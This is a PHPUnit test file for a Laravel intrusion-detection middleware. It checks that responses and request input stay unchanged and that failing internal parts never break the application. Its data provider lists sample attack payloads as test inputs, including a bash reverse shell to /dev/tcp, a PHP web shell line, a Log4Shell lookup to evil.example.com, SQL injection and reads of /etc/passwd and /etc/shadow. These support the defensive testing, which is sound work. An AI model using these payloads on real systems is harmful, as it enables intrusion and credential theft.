<?php

namespace JayAnta\ThreatDetection\Tests\Feature;

use Illuminate\Contracts\Cache\Store;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use JayAnta\ThreatDetection\Services\ThreatDetectionService;
use JayAnta\ThreatDetection\Tests\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;

/**
 * The package's whole promise in one file: it never blocks, and it never
 * breaks the app.
 *
 * Everything else — every pattern, every category, every score — is a feature.
 * This is the contract. An IDS that returns a 500 on a payload it does not
 * like has silently become a WAF with a bug, and the operator finds out from
 * their users.
 *
 * Two things are proved here:
 *
 *   1. The response a client receives is byte-for-byte what the application
 *      produced, for every class of attack payload. Not "a 200" — the same
 *      bytes, status and headers as the identical request routed around the
 *      middleware.
 *
 *   2. Every internal seam can fail — detector, database, cache, config,
 *      schema, Slack — and the request still completes normally.
 *
 * The route pairs are deliberate: /guarded and /bare run the same closure, so
 * the comparison isolates the middleware and nothing else.
 */
class PassiveInvariantTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        $this->createThreatLogsTable();
        $this->createExclusionRulesTable();

        config([
            'threat-detection.enabled' => true,
            'threat-detection.detection_mode' => 'strict',
            'threat-detection.min_confidence' => 0,
            'threat-detection.skip_paths' => [],
            'threat-detection.only_paths' => [],
            'threat-detection.whitelisted_ips' => [],
            'threat-detection.api_route_filtering.enabled' => false,
            'threat-detection.content_paths' => [],
            'threat-detection.notifications.enabled' => false,
            'threat-detection.queue.enabled' => false,
            'cache.default' => 'array',
        ]);

        $this->registerRoutePairs();
    }

    protected function tearDown(): void
    {
        // Several tests deliberately leave a cache driver that throws on every
        // call, so the usual unconditional flush would explode in teardown.
        config(['cache.default' => 'array']);

        try {
            Cache::flush();
        } catch (\Throwable) {
            // Nothing to clean up if the store never worked.
        }

        parent::tearDown();
    }

    /**
     * The same handlers registered twice: once behind the middleware, once
     * not. Anything the middleware changes shows up as a difference between
     * the two.
     */
    private function registerRoutePairs(): void
    {
        $handlers = function (string $prefix) {
            Route::get("{$prefix}/echo", fn (Request $r) => response('DOWNSTREAM-OK', 200)
                ->header('X-App-Header', 'preserved')
                ->header('Content-Type', 'text/plain'));

            Route::post("{$prefix}/echo", fn (Request $r) => response('DOWNSTREAM-OK', 200)
                ->header('X-App-Header', 'preserved'));

            // Non-200 responses must survive untouched too — a detector that
            // only preserves 200s still breaks every error page.
            Route::get("{$prefix}/missing", fn () => response('Not Here', 404));
            Route::get("{$prefix}/boom", fn () => response('Server Error', 500));
            Route::get("{$prefix}/away", fn () => redirect('/somewhere-else', 302));
            Route::get("{$prefix}/json", fn () => response()->json(['ok' => true, 'n' => 42]));
            Route::get("{$prefix}/empty", fn () => response('', 204));

            // What the application read out of the request. If the middleware
            // mutates input, these two bodies diverge.
            //
            // base64(serialize()) rather than JSON: some payloads under test
            // are deliberately not valid UTF-8, and json_encode() refuses
            // those — which would make the test fail on its own scaffolding
            // rather than on the package. The route path is left out because
            // it necessarily differs between the pair.
            $reflect = fn (Request $r) => response(base64_encode(serialize([
                'all' => $r->all(),
                'query' => $r->query(),
                'post' => $r->post(),
                'content' => $r->getContent(),
                'method' => $r->method(),
            ])));

            Route::post("{$prefix}/reflect", $reflect);
            Route::get("{$prefix}/reflect", $reflect);
        };

        Route::middleware('threat-detect')->group(fn () => $handlers('guarded'));
        $handlers('bare');
    }

    /**
     * One representative of every attack family the package claims to detect.
     * The point is not that each is detected — other files prove that — but
     * that detecting it changes nothing the client can observe.
     *
     * @return array<string, array{0: string}>
     */
    public static function attackPayloads(): array
    {
        return [
            'SQL injection UNION' => ["' UNION SELECT password FROM users--"],
            'SQL time-based blind' => ['1; WAITFOR DELAY \'0:0:5\'--'],
            'SQL DDL' => ['1; DROP TABLE users'],
            'XSS script tag' => ['<script>alert(1)</script>'],
            'XSS event handler' => ['<img src=x onerror=alert(1)>'],
            'XSS svg vector' => ['<svg onload=alert(1)>'],
            'directory traversal' => ['../../../../etc/passwd'],
            'LFI protocol' => ['php://filter/convert.base64-encode/resource=index'],
            'RCE shell function' => ['system("cat /etc/passwd")'],
            'raw PHP' => ['<?php system($_GET["c"]); ?>'],
            'web shell signature' => ['c99shell FilesMan'],
            'command chaining' => ['127.0.0.1 && cat /etc/shadow'],
            'reverse shell' => ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
            'SSTI probe' => ['{{7*7}}'],
            'SSTI config access' => ['{{config.items()}}'],
            'Log4Shell' => ['${jndi:ldap://evil.example.com/a}'],
            'XXE' => ['<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'],
            'prototype pollution' => ['__proto__[admin]=true'],
            'NoSQL operator' => ['{"$ne": null}'],
            'LDAP injection' => ['*)(uid=*))(|(uid=*'],
            'XPath injection' => ["' or contains(name(), 'a"],
            'SSRF cloud metadata' => ['http://169.254.169.254/latest/meta-data/'],
            'SSRF decimal localhost' => ['http://2130706433/'],
            'open redirect' => ['redirect=https://evil.example.com'],
            'Java deserialization' => ['rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAK'],
            'PHP object deserialization' => ['O:8:"stdClass":1:{s:4:"evil";s:2:"yes";}'],
            'Shellshock' => ['() { :;}; /bin/bash -c "id"'],
            'Spring4Shell' => ['class.module.classLoader.resources.context.parent'],
            'CRLF injection' => ['value%0d%0aSet-Cookie:%20admin=1'],
            'null byte' => ['file.php%00.jpg'],
            'double URL encoding' => ['%2527%2520UNION%2520SELECT'],
            'HTML entity encoding' => ['&#60;script&#62;alert(1)&#60;/script&#62;'],
            'IIS unicode' => ['%u003cscript%u003e'],
            'crypto miner' => ['coinhive cryptonight monero'],
            'GraphQL introspection' => ['{__schema{types{name}}}'],
            'Aadhaar-shaped PII' => ['234567890124'],
            'password exposure' => ['password=hunter2hunter2hunter2'],
            'JWT leak' => ['eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
            // A payload made only of regex metacharacters — nothing should
            // treat it as a pattern rather than data.
            'regex metacharacters' => ['((((((((((a{1,9}){1,9}){1,9})))))))))+$^\\|[]'],
            // Bytes that are not valid UTF-8. json_encode() returning false
            // here once blanked a whole segment.
            'invalid utf8' => ["\xC3\x28\xFF\xFE bad bytes ' OR 1=1"],
        ];
    }

    // ── 1. The response is what the application produced ────────────────────

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_response_is_byte_identical_to_the_unguarded_route_for_a_query_string_attack(string $payload): void
    {
        $guarded = $this->get('/guarded/echo?q=' . rawurlencode($payload));
        $bare = $this->get('/bare/echo?q=' . rawurlencode($payload));

        $this->assertSame($bare->getStatusCode(), $guarded->getStatusCode());
        $this->assertSame($bare->getContent(), $guarded->getContent());
        $this->assertSame(
            $this->comparableHeaders($bare),
            $this->comparableHeaders($guarded),
            'the middleware altered the response headers'
        );
    }

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_response_is_byte_identical_to_the_unguarded_route_for_a_post_body_attack(string $payload): void
    {
        $guarded = $this->post('/guarded/echo', ['field' => $payload]);
        $bare = $this->post('/bare/echo', ['field' => $payload]);

        $this->assertSame($bare->getStatusCode(), $guarded->getStatusCode());
        $this->assertSame($bare->getContent(), $guarded->getContent());
        $this->assertSame($this->comparableHeaders($bare), $this->comparableHeaders($guarded));
    }

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_response_is_byte_identical_to_the_unguarded_route_for_a_json_body_attack(string $payload): void
    {
        $guarded = $this->postJson('/guarded/echo', ['field' => $payload]);
        $bare = $this->postJson('/bare/echo', ['field' => $payload]);

        $this->assertSame($bare->getStatusCode(), $guarded->getStatusCode());
        $this->assertSame($bare->getContent(), $guarded->getContent());
    }

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_response_is_byte_identical_to_the_unguarded_route_for_a_header_attack(string $payload): void
    {
        $guarded = $this->get('/guarded/echo', ['X-Custom' => $payload]);
        $bare = $this->get('/bare/echo', ['X-Custom' => $payload]);

        $this->assertSame($bare->getStatusCode(), $guarded->getStatusCode());
        $this->assertSame($bare->getContent(), $guarded->getContent());
    }

    /**
     * A scanner user-agent is the one input that reaches detection on a
     * completely empty request, so it is the cleanest test that detection
     * itself — not payload parsing — leaves the response alone.
     */
    #[Test]
    public function an_attack_tool_user_agent_does_not_change_the_response(): void
    {
        $ua = ['User-Agent' => 'sqlmap/1.7.2#stable (https://sqlmap.org)'];

        $guarded = $this->get('/guarded/echo', $ua);
        $bare = $this->get('/bare/echo', $ua);

        $this->assertSame($bare->getContent(), $guarded->getContent());
        $this->assertSame($this->comparableHeaders($bare), $this->comparableHeaders($guarded));
        // And it really was detected — otherwise this proves nothing.
        $this->assertGreaterThan(0, DB::table('threat_logs')->count());
    }

    /**
     * @return array<string, array{0: string, 1: int}>
     */
    public static function downstreamResponses(): array
    {
        return [
            '404' => ['missing', 404],
            '500' => ['boom', 500],
            '302 redirect' => ['away', 302],
            'json 200' => ['json', 200],
            '204 no content' => ['empty', 204],
        ];
    }

    #[Test]
    #[DataProvider('downstreamResponses')]
    public function a_non_200_downstream_response_survives_an_attack_payload_unchanged(string $route, int $status): void
    {
        $attack = '?q=' . rawurlencode("' UNION SELECT password FROM users--") . '&x=' . rawurlencode('<script>alert(1)</script>');

        $guarded = $this->get("/guarded/{$route}{$attack}");
        $bare = $this->get("/bare/{$route}{$attack}");

        $this->assertSame($status, $guarded->getStatusCode());
        $this->assertSame($bare->getStatusCode(), $guarded->getStatusCode());
        $this->assertSame($bare->getContent(), $guarded->getContent());
        $this->assertSame($this->comparableHeaders($bare), $this->comparableHeaders($guarded));
    }

    // ── 2. Request input is never mutated ───────────────────────────────────

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_application_reads_exactly_the_input_that_was_sent(string $payload): void
    {
        $body = ['field' => $payload, 'sibling' => 'untouched', 'nested' => ['deep' => $payload]];

        $guarded = $this->reflected($this->post('/guarded/reflect', $body));
        $bare = $this->reflected($this->post('/bare/reflect', $body));

        $this->assertSame($bare, $guarded, 'the middleware changed what downstream code reads');
        $this->assertSame($payload, $guarded['all']['field']);
        $this->assertSame($payload, $guarded['all']['nested']['deep']);
        $this->assertSame('untouched', $guarded['all']['sibling']);
    }

    #[Test]
    #[DataProvider('attackPayloads')]
    public function the_raw_request_body_is_still_readable_downstream_after_scanning(string $payload): void
    {
        // rawBody() calls getContent(), which reads php://input. If it
        // consumed the stream, the application would read an empty body.
        $json = json_encode(['field' => $payload], JSON_INVALID_UTF8_SUBSTITUTE);

        $guarded = $this->reflected($this->call('POST', '/guarded/reflect', [], [], [], [
            'CONTENT_TYPE' => 'application/json',
            'HTTP_ACCEPT' => 'application/json',
        ], $json));

        $this->assertSame($json, $guarded['content'], 'the raw body was consumed before the application could read it');
        $this->assertNotSame('', $guarded['content']);
    }

    #[Test]
    public function the_query_string_is_not_rewritten_by_normalization(): void
    {
        // Normalization URL-decodes up to three times internally. That must
        // stay internal: the application still sees what the client sent,
        // decoded exactly once by the framework.
        $guarded = $this->reflected($this->get('/guarded/reflect?q=%2527%2520UNION'));
        $bare = $this->reflected($this->get('/bare/reflect?q=%2527%2520UNION'));

        $this->assertSame($bare['query'], $guarded['query']);
        $this->assertSame('%27%20UNION', $guarded['query']['q'], 'Laravel decodes once; the middleware must not decode again');
    }

    // ── 3. Every seam can fail and the request still completes ──────────────

    #[Test]
    public function the_request_completes_when_the_detector_itself_throws(): void
    {
        Log::spy();

        $this->app->instance(ThreatDetectionService::class, new ThrowingDetector);

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' OR 1=1--"));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
        Log::shouldHaveReceived('error')
            ->withArgs(fn ($m) => str_contains($m, 'ThreatDetectionMiddleware Error'))
            ->atLeast()->once();
    }

    #[Test]
    public function the_request_completes_when_the_threat_logs_table_is_absent(): void
    {
        Schema::dropIfExists('threat_logs');

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    #[Test]
    public function the_request_completes_when_the_table_is_missing_the_confidence_columns(): void
    {
        // The real-world version of this: an app that upgraded the package but
        // never published and ran the follow-up migration. Every insert fails.
        Schema::dropIfExists('threat_logs');
        DB::statement('CREATE TABLE threat_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address TEXT, url TEXT, user_agent TEXT, type TEXT, payload TEXT, threat_level TEXT, action_taken TEXT, created_at TEXT, updated_at TEXT)');

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
        $this->assertSame(0, DB::table('threat_logs')->count());
    }

    #[Test]
    public function the_request_completes_when_the_database_connection_is_gone(): void
    {
        config(['database.connections.testing.database' => '/nonexistent/path/nope.sqlite']);
        DB::purge('testing');

        $response = $this->get('/guarded/echo?q=' . rawurlencode('<script>alert(1)</script>'));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    #[Test]
    public function the_request_completes_when_the_cache_driver_throws_on_every_call(): void
    {
        Cache::extend('throwing', fn ($app) => Cache::repository(new ThrowingStore));
        config(['cache.stores.throwing' => ['driver' => 'throwing'], 'cache.default' => 'throwing']);

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    /**
     * @return array<string, array{0: array<string, mixed>}>
     */
    public static function malformedConfigs(): array
    {
        return [
            'skip_paths is a string' => [['threat-detection.skip_paths' => 'not-an-array']],
            'only_paths is a string' => [['threat-detection.only_paths' => 'admin/*']],
            'auth_paths is null' => [['threat-detection.auth_paths' => null]],
            'content_paths is an int' => [['threat-detection.content_paths' => 7]],
            'custom_patterns is a string' => [['threat-detection.custom_patterns' => 'nope']],
            'custom_patterns holds a bad regex' => [['threat-detection.custom_patterns' => ['/unterminated(/' => 'Broken']]],
            'threat_levels is a string' => [['threat-detection.threat_levels' => 'high']],
            'threat_levels values are scalars' => [['threat-detection.threat_levels' => ['high' => 'XSS']]],
            'context_weights is null' => [['threat-detection.context_weights' => null]],
            'whitelisted_ips holds objects' => [['threat-detection.whitelisted_ips' => [['nested']]]],
            'safe_fields is a string' => [['threat-detection.safe_fields' => 'content']],
            'safe_paths is a string' => [['threat-detection.safe_paths' => 'a.b']],
            'notify_levels is null' => [[
                'threat-detection.notifications.enabled' => true,
                'threat-detection.notifications.slack_webhook' => 'https://hooks.example.com/x',
                'threat-detection.notifications.notify_levels' => null,
            ]],
            'min_confidence is a word' => [['threat-detection.min_confidence' => 'high']],
            'detection_mode is unknown' => [['threat-detection.detection_mode' => 'paranoid']],
            'max_detections is negative' => [['threat-detection.max_detections_per_request' => -5]],
            'table_name is empty' => [['threat-detection.table_name' => '']],
            'pattern_validators is a string' => [['threat-detection.pattern_validators' => 'luhn']],
            'redact.labels is a string' => [['threat-detection.redact.labels' => 'Password Exposure']],
            'probe paths is a string' => [['threat-detection.probe_tracking.paths' => '/wp-admin']],
        ];
    }

    #[Test]
    #[DataProvider('malformedConfigs')]
    public function malformed_config_never_takes_the_application_down(array $overrides): void
    {
        config($overrides);
        ThreatDetectionService::flushCaches();

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $this->assertSame(200, $response->getStatusCode(), 'malformed config produced a non-200');
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    #[Test]
    #[DataProvider('malformedConfigs')]
    public function malformed_config_never_takes_down_a_clean_request_either(array $overrides): void
    {
        config($overrides);
        ThreatDetectionService::flushCaches();

        $response = $this->post('/guarded/echo', ['name' => 'Alice', 'city' => 'Guwahati']);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    #[Test]
    public function the_request_completes_when_the_slack_webhook_times_out(): void
    {
        config([
            'threat-detection.notifications.enabled' => true,
            'threat-detection.notifications.slack_webhook' => 'https://hooks.slack.example/services/T/B/X',
            'threat-detection.notifications.notify_levels' => ['high'],
        ]);

        Http::fake(fn () => throw new ConnectionException('cURL error 28: Operation timed out'));

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $response->assertStatus(200);
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());

        // And the detection is still on record — the alert failing must not
        // cost the log entry.
        $this->assertGreaterThan(0, DB::table('threat_logs')->count());
    }

    #[Test]
    public function the_request_completes_when_the_slack_webhook_returns_an_error_status(): void
    {
        config([
            'threat-detection.notifications.enabled' => true,
            'threat-detection.notifications.slack_webhook' => 'https://hooks.slack.example/services/T/B/X',
            'threat-detection.notifications.notify_levels' => ['high'],
        ]);

        Http::fake(['*' => Http::response('invalid_token', 403)]);

        $response = $this->get('/guarded/echo?q=' . rawurlencode("' UNION SELECT password FROM users--"));

        $response->assertStatus(200);
        $this->assertGreaterThan(0, DB::table('threat_logs')->count());
    }

    /**
     * Every seam broken at once. If the invariant only holds while exactly one
     * thing is wrong, it is not an invariant.
     */
    #[Test]
    public function the_request_completes_with_every_seam_broken_simultaneously(): void
    {
        Cache::extend('throwing', fn ($app) => Cache::repository(new ThrowingStore));
        config([
            'cache.stores.throwing' => ['driver' => 'throwing'],
            'cache.default' => 'throwing',
            'threat-detection.skip_paths' => 'not-an-array',
            'threat-detection.custom_patterns' => ['/unterminated(/' => 'Broken'],
            'threat-detection.notifications.enabled' => true,
            'threat-detection.notifications.slack_webhook' => 'https://hooks.slack.example/x',
        ]);
        Http::fake(fn () => throw new ConnectionException('timed out'));
        Schema::dropIfExists('threat_logs');
        ThreatDetectionService::flushCaches();

        $response = $this->post('/guarded/echo', [
            'a' => "' UNION SELECT password FROM users--",
            'b' => '<script>alert(1)</script>',
            'c' => '../../etc/passwd',
        ]);

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    /**
     * BUG 1 (fixed) — a non-numeric ddos.threshold used to take the whole application down.
     *
     * ThreatDetectionService::__construct() assigns config('...ddos.threshold')
     * straight into an `int` typed property (src/Services/ThreatDetectionService.php:36).
     * A non-numeric value is a TypeError, and it is thrown while the container
     * is *building* the middleware — before handle() runs, so the try/catch
     * inside the middleware cannot see it. Every request to the application
     * returns a 500.
     *
     * The trigger is ordinary: values read from .env arrive as strings, so
     * THREAT_DETECTION_DDOS_THRESHOLD=1k, =300/min, or a stray quote is enough.
     * Same shape for ddos.window (line 37).
     *
     * Fixed by intSetting(), which falls back to the documented default and warns once. This test is the regression guard.
     */
    #[Test]
    public function a_non_numeric_ddos_threshold_does_not_take_the_application_down(): void
    {
        config(['threat-detection.ddos.threshold' => 'lots']);

        $response = $this->get('/guarded/echo');

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    /** BUG 1, second property — same mechanism on ddos.window. */
    #[Test]
    public function a_non_numeric_ddos_window_does_not_take_the_application_down(): void
    {
        config(['threat-detection.ddos.window' => '60s']);

        $response = $this->get('/guarded/echo');

        $this->assertSame(200, $response->getStatusCode());
        $this->assertSame('DOWNSTREAM-OK', $response->getContent());
    }

    /**
     * The same values as strings-that-are-numbers, which is what a correct
     * .env actually produces. These pass — the coercion works — and they are
     * here so the bug above is not mistaken for "config must never be a
     * string".
     */
    #[Test]
    public function numeric_string_ddos_settings_from_env_are_coerced_without_complaint(): void
    {
        config(['threat-detection.ddos.threshold' => '300', 'threat-detection.ddos.window' => '60']);

        $this->get('/guarded/echo')->assertStatus(200);
    }

    /**
     * RE-5 — a number can be valid and still be nonsense.
     *
     * is_numeric() accepts negatives and zero, and both are silently
     * destructive: a threshold of 0 or below makes the very first request a
     * flood, so every client is logged as a DDoS and the log fills with
     * noise; a window of 0 or below expires the counter as fast as it is
     * written, so the count never accumulates and a real flood is never
     * detected. Both are floored at 1 and reported once.
     *
     * @return array<string, array{0: string, 1: int|string}>
     */
    public static function outOfRangeDdosSettings(): array
    {
        return [
            'zero threshold' => ['threshold', 0],
            'negative threshold' => ['threshold', -5],
            'negative threshold as a string' => ['threshold', '-5'],
            'zero window' => ['window', 0],
            'negative window' => ['window', -60],
        ];
    }

    #[Test]
    #[DataProvider('outOfRangeDdosSettings')]
    public function an_out_of_range_ddos_setting_does_not_turn_every_request_into_a_flood(string $key, int|string $value): void
    {
        config(["threat-detection.ddos.{$key}" => $value]);

        // One ordinary request from one client is not a flood under any
        // reading of these settings.
        $this->get('/guarded/echo')->assertStatus(200);

        $this->assertSame(
            0,
            DB::table('threat_logs')->where('type', '[ddos] Excessive Requests')->count(),
            "a single request was logged as a flood with ddos.{$key} = " . var_export($value, true)
        );
    }

    /**
     * ...and the floor must not disable detection either: a real flood is
     * still caught once the setting has been corrected to something sane.
     */
    #[Test]
    public function a_genuine_flood_is_still_detected_after_a_setting_was_floored(): void
    {
        config(['threat-detection.ddos.threshold' => -5, 'threat-detection.ddos.window' => 60]);

        foreach (range(1, 6) as $ignored) {
            $this->get('/guarded/echo')->assertStatus(200);
        }

        $this->assertGreaterThan(
            0,
            DB::table('threat_logs')->where('type', '[ddos] Excessive Requests')->count(),
            'flooring the threshold at 1 should still let a genuine flood through'
        );
    }

    // ── helpers ─────────────────────────────────────────────────────────────

    /**
     * Decode what the /reflect route saw.
     *
     * @return array<string, mixed>
     */
    private function reflected($response): array
    {
        return unserialize(base64_decode($response->getContent()));
    }

    /**
     * Response headers with the ones that legitimately vary between two
     * separate requests removed.
     *
     * @return array<string, array<int, string|null>>
     */
    private function comparableHeaders($response): array
    {
        $headers = $response->headers->all();
        unset($headers['date'], $headers['set-cookie'], $headers['x-request-id']);
        ksort($headers);

        return $headers;
    }
}

/** A detector that fails on every request, however it is called. */
class ThrowingDetector extends ThreatDetectionService
{
    public function detectAndLogFromRequest(Request $request): void
    {
        throw new \RuntimeException('detector exploded');
    }

    public function isWhitelisted(string $ip): bool
    {
        throw new \RuntimeException('whitelist check exploded');
    }
}

/** A cache store where nothing works — the shape of a dead Redis. */
class ThrowingStore implements Store
{
    public function get($key)
    {
        throw new \RuntimeException('cache get failed');
    }

    public function many(array $keys)
    {
        throw new \RuntimeException('cache many failed');
    }

    public function put($key, $value, $seconds)
    {
        throw new \RuntimeException('cache put failed');
    }

    public function putMany(array $values, $seconds)
    {
        throw new \RuntimeException('cache putMany failed');
    }

    public function increment($key, $value = 1)
    {
        throw new \RuntimeException('cache increment failed');
    }

    public function decrement($key, $value = 1)
    {
        throw new \RuntimeException('cache decrement failed');
    }

    public function forever($key, $value)
    {
        throw new \RuntimeException('cache forever failed');
    }

    public function forget($key)
    {
        throw new \RuntimeException('cache forget failed');
    }

    /** Added to the Store contract in Laravel 13; harmless on 10-12. */
    public function touch($key, $seconds)
    {
        throw new \RuntimeException('cache touch failed');
    }

    public function flush()
    {
        throw new \RuntimeException('cache flush failed');
    }

    public function getPrefix()
    {
        return '';
    }
}
